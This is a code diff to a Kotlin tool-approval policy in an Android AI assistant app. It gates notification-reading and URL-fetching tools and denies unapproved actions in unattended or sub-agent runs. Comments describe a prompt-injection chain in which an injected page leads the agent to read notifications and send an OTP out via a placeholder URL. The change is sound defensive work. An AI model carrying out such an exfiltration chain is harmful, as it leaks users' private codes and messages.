@@ -1,5 +1,7 @@
 package me.rerere.rikkahub.data.ai.tools
 
+import me.rerere.ai.core.Tool
+
 /**
  * Single source of truth for which tools require user approval before they execute.
  *
@@ -97,7 +99,11 @@ object ToolApprovalDefaults {
         "list_sms_inbox",
         "search_sms",
 
-        // Notification listener side effects (read-only listing is free, mutating is not)
+        // Notification listener. Listing is a privacy read of OTHER apps' data (OTP codes,
+        // chat previews, SMS text — the same content list_sms_inbox is gated for), so it is
+        // gated like the SMS/contacts reads above; mutating actions were already gated.
+        "list_recent_notifications",
+        "list_active_notifications",
         "dismiss_notification",
         "notification_action_click",
         "notification_reply",       // fires a notification's direct-reply RemoteInput action
@@ -222,6 +228,14 @@ object ToolApprovalDefaults {
         // web_extract performs the same outbound GET as web_fetch, so it carries the same
         // trust footprint and inherits the same approval gate.
         "web_extract",
+        // browser_open navigates to a model-chosen URL, so like web_fetch the URL itself can
+        // carry anything in context (…/?d=<contacts>) to any server. It was the one ungated
+        // egress path: a prompt-injected page could chain it without the user seeing a card.
+        "browser_open",
+        // scrape_web GETs a model-chosen URL (directly, or via the search provider), the same
+        // egress footprint as web_fetch. Left ungated it closed a no-approval exfil chain:
+        // injected page -> list_*_notifications -> scrape_web("https://x/?d=<otp>").
+        "scrape_web",
 
         // Phase 25 — Phase 3 second cut. Every mutating tool is approval-gated; the
         // read-only tools (keystore_verify, keystore_list_keys, list_storage_volumes,
@@ -303,4 +317,89 @@ object ToolApprovalDefaults {
      */
     fun requiresApproval(toolName: String): Boolean =
         toolName in ALWAYS_ASK || toolName.startsWith("mcp__")
+
+    /**
+     * Makes [tool] honour this policy. Every factory whose tools can land in [ALWAYS_ASK]
+     * must pass them through here: the loop only prompts when `needsApproval` returns true,
+     * so a name in the set is not enforced by itself (scrape_web, built outside LocalTools,
+     * was listed but still ran unprompted).
+     */
+    fun applyTo(tool: Tool): Tool =
+        if (requiresApproval(tool.name)) tool.copy(needsApproval = { true }) else tool
+
+    /** Who, if anyone, can answer an approval prompt in this conversation. */
+    enum class RunKind {
+        /** In-app chat or Telegram: a human sees the approval card. */
+        INTERACTIVE,
+        /** Cron / external automation / skill tester: pre-authorised, nobody watching. */
+        UNATTENDED,
+        /** Sub-agent: nobody watching; may only use what its parent chat already granted. */
+        DELEGATED,
+    }
+
+    sealed interface Decision {
+        data object Run : Decision
+        data object Prompt : Decision
+        data class Deny(val reason: String) : Decision
+    }
+
+    /** Memory writes persist into every future chat's prompt; nobody vets them unattended. */
+    const val MEMORY_TOOL = "memory_tool"
+
+    /**
+     * Whether [toolName] may skip the prompt. A grant never widens across contexts:
+     * NO_ALWAYS_ALLOW tools need a fresh per-call approval on every path (YOLO, chat scope
+     * and stale always-allow entries included — these used to be enforced by hiding a
+     * button only), and a sub-agent inherits exactly its parent chat's grants instead of
+     * the blanket auto-approval unattended runs get.
+     */
+    fun autoApproves(
+        toolName: String,
+        kind: RunKind,
+        yolo: Boolean,
+        grantedForChat: Boolean,
+        grantedForParentChat: Boolean,
+        alwaysAllowed: Boolean,
+    ): Boolean = when {
+        toolName in NO_ALWAYS_ALLOW -> false
+        yolo -> true
+        kind == RunKind.UNATTENDED -> true
+        kind == RunKind.DELEGATED -> grantedForParentChat || alwaysAllowed
+        else -> grantedForChat || alwaysAllowed
+    }
+
+    /**
+     * Per-tool decision for one step of the agent loop (after the Hardline floor). Runs that
+     * nobody watches cannot answer a prompt, so anything that would prompt is denied with a
+     * reason the model can act on, and tools that must never run unattended are denied even
+     * when they need no approval interactively.
+     */
+    // inline so the loop can pass its suspend auto-approval lookup, evaluated lazily.
+    inline fun decide(
+        toolName: String,
+        needsApproval: Boolean,
+        kind: RunKind,
+        autoApproved: () -> Boolean,
+    ): Decision {
+        if (kind != RunKind.INTERACTIVE) {
+            if (toolName in NO_ALWAYS_ALLOW) {
+                return Decision.Deny(
+                    "requires_human_approval: $toolName needs a per-call approval and cannot " +
+                        "run in an unattended or sub-agent run. Report back and let the user run it."
+                )
+            }
+            if (toolName == MEMORY_TOOL) {
+                return Decision.Deny(
+                    "memory_disabled_unattended: memory cannot be changed from an unattended or " +
+                        "sub-agent run. Put the fact in your final reply instead."
+                )
+            }
+        }
+        if (!needsApproval || autoApproved()) return Decision.Run
+        return if (kind == RunKind.INTERACTIVE) Decision.Prompt else Decision.Deny(
+            "not_authorised_for_this_run: $toolName needs approval and this run has no one to " +
+                "ask (sub-agents may only use tools the parent chat already allowed). Report " +
+                "what you need in your final reply."
+        )
+    }
 }
